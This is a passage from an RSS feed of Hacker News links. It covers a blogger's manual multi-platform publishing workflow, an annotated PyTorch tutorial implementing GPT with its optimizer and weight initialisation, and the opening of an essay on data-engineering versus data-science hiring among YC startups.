<p>Each post has its own little template. It needs an anchor tag (for this post, that's "hfbd"), a title ("20 years a blogger") and a slug ("Reflections on a lifetime of reflecting"). I fill these in for each post.</p>
<p>Then I come up with a graphic for each post: I've got a giant folder of public domain clip-art, and I'm good at using all the search tools for open-licensed art: the Library of Congress, Wikimedia, Creative Commons, Flickr Commons, and, ofc, Google Image Search.</p>
<p>I am neither an artist nor a shooper, but I've been editing clip art since I created pixel-art versions of the Frankie Goes to Hollywood glyphs using Bannermaker for the Apple //c in 1985 and printed them out on enough fan-fold paper to form a border around my bedroom.</p>
<p><img src="https://i1.wp.com/craphound.com/images/frnklogo.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/frnklogo.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>As I create the graphics, I pre-compose Creative Commons attribution strings to go in the post; there's two versions, one for the blog/newsletter and one for Mastodon/Twitter/Tumblr. I compose these manually.</p>
<p>Here's a recent one:</p>
<p>Blog/Newsletter:</p>
<p>(&lt;i&gt;Image: &lt;a href="https://commons.wikimedia.org/wiki/File:QAnon_in_red_shirt_(48555421111).jpg"&gt;Marc Nozell&lt;/a&gt;, &lt;a href="https://creativecommons.org/licenses/by/2.0/deed.en"&gt;CC BY&lt;/a&gt;, modified&lt;/i&gt;)</p>
<p>Twitter/Masto/Tumblr:<br>
Image: Marc Nozell (modified)<br>
<a href="https://commons.wikimedia.org/wiki/File:QAnon_in_red_shirt_(48555421111).jpg">https://commons.wikimedia.org/wiki/File:QAnon_in_red_shirt_(48555421111).jpg</a></p>
<p>CC BY<br>
<a href="https://creativecommons.org/licenses/by/2.0/deed.en">https://creativecommons.org/licenses/by/2.0/deed.en</a></p>
<p>This is purely manual work, but I've been composing these CC attribution strings since CC launched in 2003, and they're just muscle-memory now. Reflex.</p>
<p>These attribution strings, as well as anything else I'll need to go from Twitter to the web (for example, the names of people whose Twitter handles I use in posts, or images I drop in, go into the text file). Here's how the post looks at this point in the composition.</p>
<p>&lt;hr&gt;</p>
<p>&lt;hr&gt; &lt;a name="hfbd"&gt;&lt;/a&gt; &lt;img src="https://craphound.com/images/20yrs.jpg"&gt; &lt;h1&gt;20 years a blogger&lt;/h1&gt;&lt;xtagline&gt;Reflections on a lifetime of reflecting.&lt;/xtagline&gt; &lt;img src="https://craphound.com/images/frnklogo.jpg"&gt;</p>
<p>See that &lt;img&gt; tag in there for frnklogo.jpg? I snuck that in while I was composing this in Twitter. When I locate an image on the web I want to use in a post, I save it to a dir on my desktop that syncs every 60 seconds to the /images/ dir on my webserver.</p>
<p>As I save it, I copy the filename to my clipboard, flip over to gedit, and type in the &lt;img&gt; tag, pasting the filename. I've typed &lt;img src="https://craphound.com/images/ CTRL-V"&gt; tens of thousands of times – muscle memory.</p>
<p>Once the thread is complete, I copy each tweet back into gedit, tabbing back and forth, replacing Twitter handles and hashtags with non-Twitter versions, changing the ALL CAPS EMPHASIS to the extra-character-consuming &amp;ast;asterisk-bracketed emphasis&amp;ast;.</p>
<p>My composition is greatly aided both 20 years' worth of mnemonic slurry of semi-remembered posts and the ability to search memex.craphound.com (the site where I've mirrored all my Boing Boing posts) easily.</p>
<p>A huge, searchable database of decades of thoughts really simplifies the process of synthesis.</p>
<p>Next I port the posts to other media. I copy the headline and paste it into a new Tumblr compose tab, then import the image and tag the post "pluralistic."</p>
<p>Then I paste the text of the post into Tumblr and manually select, cut, and re-paste every URL in the post (because Tumblr's automatic URL-to-clickable-link tool's been broken for 10+ months).</p>
<p>Next I past the whole post into a Mastodon compose field. Working by trial and error, I cut it down to &lt;500 characters, breaking at a para-break and putting the rest on my clipboard. I post, reply, and add the next item in the thread until it's all done.</p>
<p><em>Then</em> I hit publish on my Twitter thread. Composing in Twitter is the most unforgiving medium I've ever worked in. You have to keep each stanza below 280 chars. You can't save a thread as a draft, so as you edit it, you have to pray your browser doesn't crash.</p>
<p>And once you hit publish, you can't edit it. Forever. So you want to publish Twitter threads <em>last</em>, because the process of mirroring them to Tumblr and Mastodon reveals typos and mistakes (but there's no way to save the thread while you work!).</p>
<p>Now I create a draft WordPress post on pluralistic.net, and create a custom slug for the page (today's is "two-decades"). Saving the draft generates the URL for the page, which I add to the XML file.</p>
<p>Once all the day's posts are done, I make sure to credit all my sources in another part of that master XML file, and then I flip to the command line and run a bunch of python scripts that do <em>magic</em>: formatting the master file as a newsletter, a blog post, and a master thread.</p>
<p>Those python scripts saved my <em>ass</em>. For the first two months of Pluralistic, i did all the reformatting by hand. It was a lot of search-replace (I used a checklist) and I <em>always</em> screwed it up and had to debug, sometimes taking hours.</p>
<p>Then, out of the blue, a reader – Loren Kohnfelder – wrote to me to point out bugs in the site's RSS. He offered to help with text automation and we embarked on a month of intensive back-and-forth as he wrote a custom suite for me.</p>
<p>Those programs take my XML file and spit out all the files I need to publish my site, newsletter and master thread (which I pin to my profile). They've saved me more time than I can say. I probably couldn't kept this up without Loren's generous help (thank you, Loren!).</p>
<p>I open up the output from the scripts in gedit. I paste the blog post into the WordPress draft and copy-paste the metadata tags into WP's "tags" field. I preview the post, tweak as necessary, and publish.</p>
<p>(And now I write this, I realize I forgot to mention that while I'm doing the graphics, I also create a square header image that makes a grid-collage out of the day's post images, using the Gimp's "alignment" tool)</p>
<p>(because I'm composing this in Twitter, it would be a <em>lot</em> of work to insert that information further up in the post, where it would make sense to have it – see what I mean about an unforgiving medium?)</p>
<p>(While I'm on the subject: putting the "add tweet to thread" and "publish the whole thread" buttons next to each other is a cruel joke that has caused me to repeatedly publish before I was done, and deleting a thread after you publish it is a nightmare)</p>
<p>Now I paste the newsletter file into a new mail message, address it to my Mailman server, and create a custom subject for the day, send it, open the Mailman admin interface in a browser, and approve the message.</p>
<p>Now it's time to create that anthology post you can see pinned to my Mastodon and Twitter accounts. Loren's script uses a template to produce all the tweets for the day, but it's not easy to get that pre-written thread into Twitter and Mastodon.</p>
<p>Part of the problem is that each day's Twitter master thread has a tweet with a link to the day's Mastodon master thread ("Are you trying to wean yourself off Big Tech? Follow these threads on the #fediverse at @pluralistic@mamot.fr. Here's today's edition: LINK").</p>
<p>So the first order of business is to create the Mastodon thread, pin it, copy the link to it, and paste it into the template for the Twitter thread, then create and pin the Twitter thread.</p>
<p>Now it's time to get ready for tomorrow. I open up the master XML template file and overwrite my daily working file with its contents. I edit the file's header with tomorrow's date, trim away any "Upcoming appearances" that have gone by, etc.</p>
<p>Then I compose tomorrow's retrospective links. I open tabs for this day a year ago, 5 years ago, 10 years ago, 15 years ago, and (now) 20 years ago:</p>
<p><a href="http://memex.craphound.com/2020/01/14">http…</a></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/01/13/two-decades/#hfbd">https://pluralistic.net/2021/01/13/two-decades/#hfbd</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/01/13/two-decades/#hfbd</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775978</guid>
            <pubDate>Thu, 14 Jan 2021 13:22:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GPT-2 architecture implementation with notes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25775925">thread link</a>) | @vpj
<br/>
January 14, 2021 | https://lab-ml.com/labml_nn/transformers/gpt/ | <a href="https://web.archive.org/web/*/https://lab-ml.com/labml_nn/transformers/gpt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
    
    
    <div id="section-0">
        <div>
                
                
<p>This is an tutorial of
<a href="https://openai.com/blog/better-language-models/">OpenAI GPT architecture</a>.
We got a bunch of implementation details from
<a href="https://github.com/karpathy/minGPT">minGPT</a>
by <a href="https://twitter.com/karpathy">@karpathy</a>.
This implementation also uses character tiny shakespeare dataset.</p>
<p>GPT model is essentially a standard transformer with a few tweaks.
GPT-2 and especially GPT-3 models are quite large and won’t fit on a
single GPU and will need model parallelism.
This implementation doesn’t even use data parallelism and is intended to be
more of a tutorial.</p>
<p>Main differences of this to a standard autoregressive transformer
are the parameter initialization, weight decay, and learning rate schedule.
For the transformer we reuse the
<a href="https://lab-ml.com/labml_nn/transformers/">existing labml/nn transformer implementation</a>.</p>
<p>Here’s a notebook for training a GPT model on Tiny Shakespeare dataset.</p>
<p><a href="https://colab.research.google.com/github/lab-ml/nn/blob/master/labml_nn/transformers/gpt/experiment.ipynb"><img alt="Open In Colab" src="https://colab.research.google.com/assets/colab-badge.svg"></a>
<a href="https://web.lab-ml.com/run?uuid=0324c6d0562111eba65d0242ac1c0002"><img alt="View Run" src="https://img.shields.io/badge/labml-experiment-brightgreen"></a></p>
            </div>
            <div>
                <div><pre><span>34</span><span></span><span>import</span> <span>torch</span>
<span>35</span><span>from</span> <span>torch</span> <span>import</span> <span>nn</span>
<span>36</span>
<span>37</span><span>from</span> <span>labml</span> <span>import</span> <span>experiment</span>
<span>38</span><span>from</span> <span>labml.configs</span> <span>import</span> <span>option</span>
<span>39</span><span>from</span> <span>labml_helpers.module</span> <span>import</span> <span>Module</span>
<span>40</span><span>from</span> <span>labml_nn.experiments.nlp_autoregression</span> <span>import</span> <span>NLPAutoRegressionConfigs</span>
<span>41</span><span>from</span> <span>labml_nn.optimizers.configs</span> <span>import</span> <span>OptimizerConfigs</span>
<span>42</span><span>from</span> <span>labml_nn.transformers</span> <span>import</span> <span>TransformerConfigs</span><span>,</span> <span>Encoder</span>
<span>43</span><span>from</span> <span>labml_nn.transformers.utils</span> <span>import</span> <span>subsequent_mask</span></pre></div>
            </div>
        </div>
    <div id="section-1">
        <div>
                
                <h2>GPT model</h2>
<p>This consists of a token embedding layer, transformer encoder, and
a final linear layer that gives token logits.</p>
            </div>
            
        </div>
    <div id="section-2">
        
            <div>
                <div><pre><span>54</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>encoder</span><span>:</span> <span>Encoder</span><span>,</span> <span>src_embed</span><span>:</span> <span>Module</span><span>,</span> <span>generator</span><span>:</span> <span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-3">
            
            <div>
                <div><pre><span>61</span>        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>()</span>
<span>62</span>        <span>self</span><span>.</span><span>src_embed</span> <span>=</span> <span>src_embed</span>
<span>63</span>        <span>self</span><span>.</span><span>encoder</span> <span>=</span> <span>encoder</span>
<span>64</span>        <span>self</span><span>.</span><span>generator</span> <span>=</span> <span>generator</span></pre></div>
            </div>
        </div>
    <div id="section-4">
            <div>
                
                <p>The mask will be initialized on the first call</p>
            </div>
            
        </div>
    <div id="section-5">
            
            <div>
                <div><pre><span>69</span>    <span>def</span> <span>__call__</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-6">
            <div>
                
                <p>Create subsequent mask if mask is not initialized
or if the size of the mask is different</p>
            </div>
            <div>
                <div><pre><span>72</span>        <span>if</span> <span>self</span><span>.</span><span>mask</span> <span>is</span> <span>None</span> <span>or</span> <span>self</span><span>.</span><span>mask</span><span>.</span><span>size</span><span>(</span><span>0</span><span>)</span> <span>!=</span> <span>len</span><span>(</span><span>x</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-7">
            <div>
                
                <p>Subsequent mask, will mask out tokens from seeing future tokens</p>
            </div>
            <div>
                <div><pre><span>74</span>            <span>self</span><span>.</span><span>mask</span> <span>=</span> <span>subsequent_mask</span><span>(</span><span>len</span><span>(</span><span>x</span><span>))</span><span>.</span><span>to</span><span>(</span><span>x</span><span>.</span><span>device</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-8">
            <div>
                
                <p>Get the token embeddings with positional encodings</p>
            </div>
            
        </div>
    <div id="section-9">
            
            <div>
                <div><pre><span>78</span>        <span>x</span> <span>=</span> <span>self</span><span>.</span><span>encoder</span><span>(</span><span>x</span><span>,</span> <span>self</span><span>.</span><span>mask</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-11">
            <div>
                
                <p>Return results
(second value is for state, since our trainer is used with RNNs also)</p>
            </div>
            
        </div>
    <div id="section-12">
        
            <div>
                <div><pre><span>87</span><span>class</span> <span>Configs</span><span>(</span><span>NLPAutoRegressionConfigs</span><span>):</span></pre></div>
            </div>
        </div>
    
    <div id="section-14">
            
            <div>
                <div><pre><span>98</span>    <span>transformer</span><span>:</span> <span>TransformerConfigs</span></pre></div>
            </div>
        </div>
    <div id="section-15">
            
            <div>
                <div><pre><span>100</span>    <span>weight_decay</span><span>:</span> <span>float</span> <span>=</span> <span>0.1</span></pre></div>
            </div>
        </div>
    <div id="section-16">
            <div>
                
                <p>Number of tokens for wamup</p>
            </div>
            <div>
                <div><pre><span>102</span>    <span>warmup_steps</span><span>:</span> <span>int</span> <span>=</span> <span>128</span> <span>*</span> <span>128</span> <span>*</span> <span>20</span></pre></div>
            </div>
        </div>
    <div id="section-17">
            
            <div>
                <div><pre><span>105</span>    <span>optimizer</span> <span>=</span> <span>'transformer_optimizer'</span></pre></div>
            </div>
        </div>
    <div id="section-18">
        <div>
                
                <h3>Transformer configurations</h3>
            </div>
            <div>
                <div><pre><span>108</span><span>@option</span><span>(</span><span>Configs</span><span>.</span><span>transformer</span><span>,</span> <span>'GPT'</span><span>)</span>
<span>109</span><span>def</span> <span>_transformer_configs</span><span>(</span><span>c</span><span>:</span> <span>Configs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-19">
            
            <div>
                <div><pre><span>116</span>    <span>conf</span> <span>=</span> <span>TransformerConfigs</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-20">
            <div>
                
                <p>Set the vocabulary sizes for embeddings and generating logits</p>
            </div>
            <div>
                <div><pre><span>118</span>    <span>conf</span><span>.</span><span>n_src_vocab</span> <span>=</span> <span>c</span><span>.</span><span>n_tokens</span>
<span>119</span>    <span>conf</span><span>.</span><span>n_tgt_vocab</span> <span>=</span> <span>c</span><span>.</span><span>n_tokens</span></pre></div>
            </div>
        </div>
    <div id="section-21">
            <div>
                
                <p>GPT uses GELU activation for position wise feedforward</p>
            </div>
            <div>
                <div><pre><span>121</span>    <span>conf</span><span>.</span><span>feed_forward_activation</span> <span>=</span> <span>'GELU'</span></pre></div>
            </div>
        </div>
    
    <div id="section-23">
        <div>
                
                <h3>Initialize weights</h3>
<p>Weights of linear layers and embedding layers are initialized
to $\mathcal{N}(0, 0.02)$
instead of the default Xavier initialzation.</p>
            </div>
            <div>
                <div><pre><span>127</span><span>def</span> <span>_init_weights</span><span>(</span><span>module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-24">
            
            <div>
                <div><pre><span>136</span>    <span>if</span> <span>not</span> <span>isinstance</span><span>(</span><span>module</span><span>,</span> <span>(</span><span>nn</span><span>.</span><span>Linear</span><span>,</span> <span>nn</span><span>.</span><span>Embedding</span><span>)):</span>
<span>137</span>        <span>return</span>
<span>138</span>
<span>139</span>    <span>module</span><span>.</span><span>weight</span><span>.</span><span>data</span><span>.</span><span>normal_</span><span>(</span><span>mean</span><span>=</span><span>0.0</span><span>,</span> <span>std</span><span>=</span><span>0.02</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-25">
            
            <div>
                <div><pre><span>142</span>    <span>if</span> <span>isinstance</span><span>(</span><span>module</span><span>,</span> <span>nn</span><span>.</span><span>Linear</span><span>)</span> <span>and</span> <span>module</span><span>.</span><span>bias</span> <span>is</span> <span>not</span> <span>None</span><span>:</span>
<span>143</span>        <span>module</span><span>.</span><span>bias</span><span>.</span><span>data</span><span>.</span><span>zero_</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-26">
        <div>
                
                <p>Create GPT model and initialize weights</p>
            </div>
            <div>
                <div><pre><span>146</span><span>@option</span><span>(</span><span>Configs</span><span>.</span><span>model</span><span>)</span>
<span>147</span><span>def</span> <span>_model</span><span>(</span><span>c</span><span>:</span> <span>Configs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-27">
            
            <div>
                <div><pre><span>151</span>    <span>m</span> <span>=</span> <span>GPT</span><span>(</span><span>c</span><span>.</span><span>transformer</span><span>.</span><span>encoder</span><span>,</span>
<span>152</span>            <span>c</span><span>.</span><span>transformer</span><span>.</span><span>src_embed</span><span>,</span>
<span>153</span>            <span>c</span><span>.</span><span>transformer</span><span>.</span><span>generator</span><span>)</span><span>.</span><span>to</span><span>(</span><span>c</span><span>.</span><span>device</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-28">
            <div>
                
                <p>Apply custom weight initialization</p>
            </div>
            <div>
                <div><pre><span>156</span>    <span>m</span><span>.</span><span>apply</span><span>(</span><span>_init_weights</span><span>)</span>
<span>157</span>
<span>158</span>    <span>return</span> <span>m</span></pre></div>
            </div>
        </div>
    <div id="section-29">
        <div>
                
                <h3>Create custom optimizer with weight decay</h3>
<p>This code is taken from <a href="https://github.com/karpathy/minGPT">minGPT</a>.
This applies weight decay only to weights of linear layers.</p>
            </div>
            <div>
                <div><pre><span>161</span><span>@option</span><span>(</span><span>NLPAutoRegressionConfigs</span><span>.</span><span>optimizer</span><span>)</span>
<span>162</span><span>def</span> <span>transformer_optimizer</span><span>(</span><span>c</span><span>:</span> <span>NLPAutoRegressionConfigs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-30">
            <div>
                
                <p>Collect names of parameters to apply weight decay</p>
            </div>
            <div>
                <div><pre><span>170</span>    <span>decay</span> <span>=</span> <span>set</span><span>()</span>
<span>171</span>    <span>for</span> <span>mn</span><span>,</span> <span>m</span> <span>in</span> <span>c</span><span>.</span><span>model</span><span>.</span><span>named_modules</span><span>():</span>
<span>172</span>        <span>for</span> <span>pn</span><span>,</span> <span>p</span> <span>in</span> <span>m</span><span>.</span><span>named_parameters</span><span>():</span>
<span>173</span>            <span>fpn</span> <span>=</span> <span>f</span><span>'</span><span>{</span><span>mn</span><span>}</span><span>.</span><span>{</span><span>pn</span><span>}</span><span>'</span> <span>if</span> <span>mn</span> <span>else</span> <span>pn</span>  <span># full param name</span>
<span>174</span>
<span>175</span>            <span>if</span> <span>fpn</span><span>.</span><span>endswith</span><span>(</span><span>'weight'</span><span>)</span> <span>and</span> <span>isinstance</span><span>(</span><span>m</span><span>,</span> <span>nn</span><span>.</span><span>Linear</span><span>):</span>
<span>176</span>                <span>decay</span><span>.</span><span>add</span><span>(</span><span>fpn</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-31">
            
            <div>
                <div><pre><span>179</span>    <span>param_dict</span> <span>=</span> <span>{</span><span>pn</span><span>:</span> <span>p</span> <span>for</span> <span>pn</span><span>,</span> <span>p</span> <span>in</span> <span>c</span><span>.</span><span>model</span><span>.</span><span>named_parameters</span><span>()}</span></pre></div>
            </div>
        </div>
    <div id="section-32">
            <div>
                
                <p>Parameters that are not decayed</p>
            </div>
            <div>
                <div><pre><span>181</span>    <span>no_decay</span> <span>=</span> <span>set</span><span>(</span><span>param_dict</span><span>.</span><span>keys</span><span>())</span> <span>-</span> <span>decay</span></pre></div>
            </div>
        </div>
    <div id="section-33">
            <div>
                
                <p>create the pytorch optimizer object</p>
            </div>
            <div>
                <div><pre><span>184</span>    <span>opt_groups</span> <span>=</span> <span>[</span>
<span>185</span>        <span>{</span><span>"params"</span><span>:</span> <span>[</span><span>param_dict</span><span>[</span><span>pn</span><span>]</span> <span>for</span> <span>pn</span> <span>in</span> <span>sorted</span><span>(</span><span>list</span><span>(</span><span>decay</span><span>))],</span> <span>"weight_decay"</span><span>:</span> <span>c</span><span>.</span><span>weight_decay</span><span>},</span>
<span>186</span>        <span>{</span><span>"params"</span><span>:</span> <span>[</span><span>param_dict</span><span>[</span><span>pn</span><span>]</span> <span>for</span> <span>pn</span> <span>in</span> <span>sorted</span><span>(</span><span>list</span><span>(</span><span>no_decay</span><span>))],</span> <span>"weight_decay"</span><span>:</span> <span>0.0</span><span>},</span>
<span>187</span>    <span>]</span></pre></div>
            </div>
        </div>
    <div id="section-34">
            
            <div>
                <div><pre><span>192</span>    <span>optimizer</span> <span>=</span> <span>OptimizerConfigs</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-35">
            <div>
                
                <p>Set parameter groups for optimization</p>
            </div>
            <div>
                <div><pre><span>195</span>    <span>optimizer</span><span>.</span><span>parameters</span> <span>=</span> <span>opt_groups</span></pre></div>
            </div>
        </div>
    <div id="section-36">
            
            <div>
                <div><pre><span>198</span>    <span>optimizer</span><span>.</span><span>optimizer</span> <span>=</span> <span>'AdamWarmupCosineDecay'</span></pre></div>
            </div>
        </div>
    <div id="section-37">
            <div>
                
                <p>Set model embedding size, required if we use <a href="https://lab-ml.com/labml_nn/transformers/optimizers/noam.html">Noam optimizer</a>
which has an exponential decay</p>
            </div>
            <div>
                <div><pre><span>201</span>    <span>optimizer</span><span>.</span><span>d_model</span> <span>=</span> <span>c</span><span>.</span><span>d_model</span></pre></div>
            </div>
        </div>
    <div id="section-38">
            <div>
                
                <p>Set default weight decay.
This is not required since we set the weight decay in the parameter groups</p>
            </div>
            <div>
                <div><pre><span>204</span>    <span>optimizer</span><span>.</span><span>weight_decay</span> <span>=</span> <span>c</span><span>.</span><span>weight_decay</span></pre></div>
            </div>
        </div>
    <div id="section-39">
            <div>
                
                <p>GPT uses a maximum learning rate of $6 \times 10^{-4}$</p>
            </div>
            <div>
                <div><pre><span>206</span>    <span>optimizer</span><span>.</span><span>learning_rate</span> <span>=</span> <span>6e-4</span></pre></div>
            </div>
        </div>
    <div id="section-40">
            <div>
                
                <p>$\beta_1 = 0.9, \beta_2 = 0.95$</p>
            </div>
            <div>
                <div><pre><span>208</span>    <span>optimizer</span><span>.</span><span>betas</span> <span>=</span> <span>(</span><span>0.9</span><span>,</span> <span>0.95</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-42">
            <div>
                
                <p>Weight decay decoupled from gradients</p>
            </div>
            <div>
                <div><pre><span>212</span>    <span>optimizer</span><span>.</span><span>weight_decouple</span> <span>=</span> <span>True</span></pre></div>
            </div>
        </div>
    <div id="section-43">
            <div>
                
                <p>Total number of optimization steps for learning rate cosine decay</p>
            </div>
            <div>
                <div><pre><span>214</span>    <span>optimizer</span><span>.</span><span>total_steps</span> <span>=</span> <span>c</span><span>.</span><span>epochs</span> <span>*</span> <span>len</span><span>(</span><span>c</span><span>.</span><span>text</span><span>.</span><span>train</span><span>)</span> <span>//</span> <span>(</span><span>c</span><span>.</span><span>batch_size</span> <span>*</span> <span>c</span><span>.</span><span>seq_len</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-44">
            <div>
                
                <p>Number of warmup optimization steps</p>
            </div>
            <div>
                <div><pre><span>216</span>    <span>optimizer</span><span>.</span><span>warmup</span> <span>=</span> <span>c</span><span>.</span><span>warmup_steps</span> <span>//</span> <span>(</span><span>c</span><span>.</span><span>batch_size</span> <span>*</span> <span>c</span><span>.</span><span>seq_len</span><span>)</span>
<span>217</span>
<span>218</span>    <span>return</span> <span>optimizer</span></pre></div>
            </div>
        </div>
    
    <div id="section-46">
            
            <div>
                <div><pre><span>223</span>    <span>experiment</span><span>.</span><span>create</span><span>(</span><span>name</span><span>=</span><span>"gpt"</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-48">
            
            <div>
                <div><pre><span>227</span>    <span>experiment</span><span>.</span><span>configs</span><span>(</span><span>conf</span><span>,</span> <span>{</span></pre></div>
            </div>
        </div>
    <div id="section-49">
            <div>
                
                <p>Use character level tokenizer</p>
            </div>
            <div>
                <div><pre><span>229</span>        <span>'tokenizer'</span><span>:</span> <span>'character'</span><span>,</span></pre></div>
            </div>
        </div>
    <div id="section-50">
            <div>
                
                <p>Prompt separator is blank</p>
            </div>
            <div>
                <div><pre><span>231</span>        <span>'prompt_separator'</span><span>:</span> <span>''</span><span>,</span></pre></div>
            </div>
        </div>
    <div id="section-51">
            <div>
                
                <p>Starting prompt for sampling</p>
            </div>
            
        </div>
    <div id="section-52">
            <div>
                
    …</div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lab-ml.com/labml_nn/transformers/gpt/">https://lab-ml.com/labml_nn/transformers/gpt/</a></em></p>]]>
            </description>
            <link>https://lab-ml.com/labml_nn/transformers/gpt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775925</guid>
            <pubDate>Thu, 14 Jan 2021 13:16:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We don't need data scientists, we need data engineers]]>
            </title>
            <description>
<![CDATA[
Score 640 | Comments 319 (<a href="https://news.ycombinator.com/item?id=25775872">thread link</a>) | @winkywooster
<br/>
January 14, 2021 | https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/ | <a href="https://web.archive.org/web/*/https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="11"><figure>
    
  <a href="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-85f3f.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="world in data" title="" src="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c6823.jpg" srcset="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-dad4f.jpg 240w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-1808a.jpg 480w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c6823.jpg 960w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-e8e5f.jpg 1440w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-54793.jpg 1920w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c4df6.jpg 2880w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-85f3f.jpg 4256w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>Data. It’s everywhere and we’re <a href="https://techjury.net/blog/how-much-data-is-created-every-day/#gref">only getting more of it</a>. For the last 5-10 years, <em>data science</em> has attracted newcomers near and far trying to get a taste of that forbidden fruit. </p>
<p>But what does the state of <em>data science</em> hiring look like today?</p>
<p>Here’s the gist of the article in two-sentences for the busy reader.</p>
<p><strong>TLDR</strong>: There are <strong>70% more open roles</strong> at companies in <em>data engineering</em> as compared to <em>data science</em>. As we train the next generation of data and machine learning practitioners, let’s place more emphasis on engineering skills.</p>
<hr>
<p>As part of my work developing an <a href="https://www.confetti.ai/">educational platform</a> for data professionals, I think a lot about how the market for data-driven (machine learning and data science) roles is evolving. </p>
<p>In talking to dozens of prospective entrants to data fields including students at top institutions around the world, I’ve seen a tremendous amount of confusion around what skills are most important to help candidates stand out in the crowd and prepare for their careers. </p>
<p>When you think about it, a <em>data scientist</em> can be responsible for any subset of the following: machine learning modelling, visualization, data cleaning and processing (i.e. SQL wrangling), engineering, and production deployment. </p>
<p>How do you even begin to recommend a study curriculum for newcomers?</p>
<p>Data speaks louder than words. So I decided to do an analysis of the data roles being hired for at every company coming out of <a href="https://www.ycombinator.com/">Y-Combinator</a> since 2012. The questions that guided my research:</p>
<ul>
<li>What data roles are companies most frequently hiring for?</li>
<li>How in-demand is the conventional <em>data scientist</em> that we talk about so much?</li>
<li>Are the same skills that started the data revolution relevant today?</li>
</ul>
<p>If you want the full details and analysis, read on. </p>
<h2>Methodology</h2>
<p>I chose to do an analysis of YC portfolio companies that claim to make some sort of data work part of their value proposition. </p>
<p>Why focus on YC? Well, for starters, they do a good job of providing an easily searchable (and scrapable) <a href="https://www.ycombinator.com/companies/">directory of their companies</a>. </p>
<p>In addition, as a particularly forward-thinking incubator that has funded companies from around the world across domains for over a decade, I felt they provided a representative sample of the market with which to conduct my analyses. That being said, take what I say wit a grain of salt, as I didn’t analyze super-large tech companies.</p>
<p>I scraped the homepage URLs of every YC company since 2012, producing an initial pool of ~1400 companies. </p>
<p>Why stop at 2012? Well, 2012 was the year that <a href="https://en.wikipedia.org/wiki/AlexNet">AlexNet</a> won the ImageNet competition, effectively kickstarting the machine learning and data-modelling wave we are now living through. It’s fair to say that this birthed some of the earliest generations of data-first companies.</p>
<p>From this initial pool, I performed keyword filtering to reduce the number of relevant companies I would have to look through. In particular, I only considered companies whose websites included at least one of the following terms: AI, CV, NLP, natural language processing, computer vision, artificial intelligence, machine, ML, data. I also disregarded companies whose website links were broken. </p>
<p>Did this generate a ton of false positives? Absolutely! But here I was trying to prioritize high recall as much as possible, recognizing that I would do a more fine-grained manual inspection of the individual websites for relevant roles.</p>
<p>With this reduced pool, I went through every site, found where they were advertising jobs (typically a <em>Careers</em>, <em>Jobs</em>, or <em>We’re Hiring</em> page), and took note of every role that included data, machine learning, NLP, or CV in the title. This gave me a pool of about 70 distinct companies hiring for data roles. </p>
<p>One note here: it’s conceivable that I missed some companies as there were certain websites with very little information (typically those in stealth) that might actually be hiring. In addition, there were companies that didn’t have a formal <em>Careers</em> page but asked that prospective candidates reach out directly via email. </p>
